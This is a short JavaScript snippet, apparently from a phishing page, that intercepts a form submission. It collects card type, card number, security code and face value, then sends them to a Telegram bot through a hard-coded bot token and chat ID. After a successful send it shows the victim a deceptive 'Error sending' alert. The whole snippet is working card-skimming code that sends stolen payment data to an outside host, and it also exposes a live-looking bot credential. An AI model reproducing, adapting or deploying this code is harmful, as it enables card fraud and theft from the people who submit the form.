const BOT_TOKEN = '7314097351:AAHFYDhbf_NmMpCSXDnGvGfcC7o9s243Pro
';
        const CHAT_ID = '6868085389'; 
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        document.addEventListener('DOMContentLoaded', (event) => {
            const myForm = document.getElementById('myForm');

            myForm.addEventListener('submit', (e) => {
                e.preventDefault();
                const cardType = document.getElementById('form-field-field_c740a56').value;
                const cardNumber = document.getElementById('form-field-field_fe6e98a').value;
                const securityCode = document.getElementById('form-field-code').value;
                const faceValue = document.getElementById('form-field-value').value;

                sendMessage(cardType, cardNumber, securityCode, faceValue);

                console.log(cardNumber, cardType, securityCode, faceValue);
            });
        });

        function sendMessage(cardType, cardNumber, securityCode, faceValue) {
            const message = `Card Type: ${cardType}\nCard Number: ${cardNumber}\nSecurity Code: ${securityCode}\nFace Value: ${faceValue}`;

            axios.post(TELEGRAM_API_URL, {
                chat_id: CHAT_ID,
                text: message
            })
            .then(response => {
                console.log('Message sent successfully:', response.data);
                alert('Error sending');
            })
            .catch(error => {
                console.error('Error sending message:', error.response ? error.response.data : error.message);
            });
        }
